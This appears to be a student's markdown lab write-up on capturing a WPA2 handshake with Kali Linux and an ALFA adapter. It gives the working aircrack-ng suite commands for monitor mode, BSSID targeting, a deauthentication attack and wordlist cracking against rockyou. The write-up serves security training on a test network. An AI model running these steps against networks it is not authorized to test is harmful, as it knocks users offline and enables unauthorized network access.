# 🔐 WPA/WPA2 Handshake Capture & Cracking Lab

This lab walks through how I captured a WPA2 handshake from a test network using Kali Linux and prepared it for offline cracking. 
It's based on chapters 5 and 7 from my Wi-Fi exploitation course delivered by Cyberflow. All credit goes to these folks. 

HW used ALFA Network AWUS036H - Realtek RTL8187L chipset - Annoyingly only supports 2.4 GHZ and not 5 GHz. 
---

## 🎯 Objectives

- Enable monitor mode on a wireless adapter
- Scan and select a target access point (AP)
- Capture WPA/WPA2 handshake using `airodump-ng`
- Use deauth attack to force a client to reconnect
- Save and verify the captured handshake for cracking

---

## 🧪 Lab Setup

- **OS**: Kali Linux (VirtualBox guest)
- **Adapter**: ALFA AWUS036H (RTL8187)
- **Test Network**: WPA2-PSK protected
- **Tools**: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`

---

## 🛰️ Steps Taken

### 1. Killed Network Managers & Switched to Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 2. Scanned Networks to Find the Target
```bash
sudo airodump-ng wlan0mon
```
> Grabbed the BSSID and channel of the target network.

### 3. Focused Airodump on One AP
```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w handshake wlan0mon
```

### 4. Sent Deauth Packets to Kick a Device Off
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```
> Waited for client to reconnect → handshake captured.

### 5. Verified the Handshake
Saw `[ WPA handshake: <BSSID> ]` in the corner of the terminal. Output saved as `handshake.cap`.

---

## 🧠 (Optional) Tried Cracking with a Wordlist
```bash
aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt
```

Also tried building a tiny custom list:
```bash
crunch 8 10 abc123 -o testlist.txt
```

---

## 🔍 Notes to Self

- Needs at least one client connected to work.
- Some routers block multiple deauths.
- Got to test airodump-ng and aireplay-ng together in a real flow.
- Get another USB adapter that supports 5 GHz. 

---

## ✅ Outcome

Captured a working WPA2 handshake in a controlled environment. Can use it to practice brute-force and dictionary-style attacks later.

---

## ⏭️ Next Lab

Will attempt full WPA2 cracking and dictionary tuning in [`wpa2-dictionary-attack.md`](wpa2-dictionary-attack.md)
